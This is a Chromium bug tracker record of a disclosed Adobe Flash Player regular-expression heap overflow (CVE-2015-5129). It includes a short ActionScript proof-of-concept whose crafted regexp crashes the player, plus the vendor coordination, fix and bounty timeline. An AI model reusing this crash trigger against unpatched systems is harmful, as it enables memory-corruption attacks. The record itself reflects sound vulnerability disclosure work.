# Security: [FG-VD-15-037] Adobe Flash Player PCRE Handing Heap Overflow Vulnerability

| Field | Value |
|-------|-------|
| **Issue ID** | [40081979](https://issues.chromium.org/issues/40081979) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P2 |
| **Component** | Internals>Plugins>Flash |
| **CVE IDs** | CVE-2015-5129 |
| **Reporter** | ke...@gmail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2015-05-01 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

This bug can be triggered by executing string match after compiling a specifically crafted regexp in ActionScript code. It seems that it's a heap overflow issue,but I need more time to confirm it.

**VERSION**  

Chrome 42.0.2311.135 m(32-bit) / Windows 8.1 x64  

Chromium 44.0.2388.0 (32-bit) / Windows 8.1 x64  

Other versions may be affected too

**REPRODUCTION CASE**

1. Compile the following ActionScript code with Flex SDK:

package {  

import flash.display.Sprite;  

import flash.external.\*;

public class Main extends Sprite  

{  

public function Main():void  

{  

var ptn:RegExp = /((?2){0,1999}(?(?=.\*b)((?>(?(?=.\*(?<t>([^m])(a|)+))b|^)))|^)\*)?/;  

var str:String = "Fortinet";  

ptn.exec(str);  

}  

}

}

And generate the PoC.swf  

2. Lauch the browser and open the PoC.swf.  

3. Refresh the tab a few times if it doesn't crash immediately.

Credits:  

This vulnerability was discovered by Kai Lu of Fortinet's FortiGuard Labs.

## Attachments

- [crashinfo_windbg.txt](attachments/crashinfo_windbg.txt) (text/plain, 7.9 KB)
- [Main.as](attachments/Main.as) (application/octet-stream, 296 B)
- [repro.swf](attachments/repro.swf) (application/octet-stream, 688 B)

## Timeline

### mb...@chromium.org (2015-05-01)

[Empty comment from Monorail migration]

### pa...@google.com (2015-05-01)

[Empty comment from Monorail migration]

### la...@google.com (2015-05-01)

[Empty comment from Monorail migration]

### [Deleted User] (2015-05-01)

Thanks for the report! I see a similar crash on 64-bit Linux:

movzbl (%rax),%eax    <-- bad read here.
cmp    $0x53,%al

For now, it looks like a bad read instead of a bad write, but let me know if you can see any evidence of memory corruption.

I'll pass this report along to Adobe. Do you have any particular disclosure deadline requirements?

### ke...@gmail.com (2015-05-01)

We'll publish the advisory until the vendor will fix this issue.

### sc...@gmail.com (2015-05-04)

[Empty comment from Monorail migration]

### [Deleted User] (2015-05-04)

[Empty comment from Monorail migration]

### sc...@gmail.com (2015-05-05)

This is PSIRT-3644.

### sc...@gmail.com (2015-07-24)

[Empty comment from Monorail migration]

### na...@google.com (2015-07-27)

Adobe has requested another 45 days to fix this issue. Is this okay, or do you have a disclosure deadline?

### ke...@gmail.com (2015-07-27)

It's OK, we'll publish the advisory until the vendor will fix this issue.



### ke...@gmail.com (2015-08-13)

It seems that adobe had fixed this issue in patches of August 11, 2015.
It refers to https://helpx.adobe.com/security/products/flash-player/apsb15-19.html

The Acknowledgments from apsb15-19 shows below:
Kai Lu of Fortinet's FortiGuard Labs (CVE-2015-5129)

Would you check the status of this issue? Thanks


### ke...@gmail.com (2015-08-17)

Request a status update, thanks

### na...@google.com (2015-08-18)

Yes this was fixed in the last update, thanks for reporting!

### ke...@gmail.com (2015-09-21)

Request a status update, thanks!

### [Deleted User] (2015-09-21)

This was shipped back on August 11th.  It's CVE-2015-5129.  Here's the corresponding Adobe security bulletin: https://helpx.adobe.com/security/products/flash-player/apsb15-19.html

### ti...@google.com (2015-09-28)

As the fix has shipped, this report will go to the reward panel this week.

### ke...@gmail.com (2015-09-28)

Ok,thanks

### ti...@google.com (2015-10-09)

Congratulations - our reward panel decided on a $3,000 reward for this report.

Our finance team should be in contact within a week. Please contact me at timwillis@ or update this bug if that doesn't happen.

### ke...@gmail.com (2015-10-09)

Nice, thanks!

### ti...@google.com (2015-10-16)

[Empty comment from Monorail migration]

### ti...@google.com (2015-10-29)

Payment is on its way - should arrive in ~7 days. Thanks again for your report!

### cl...@chromium.org (2016-02-04)

This security bug has been closed for more than 14 weeks. Removing view restrictions.

- Your friendly ClusterFuzz

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-01)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/483375?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/484005]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40081979)*
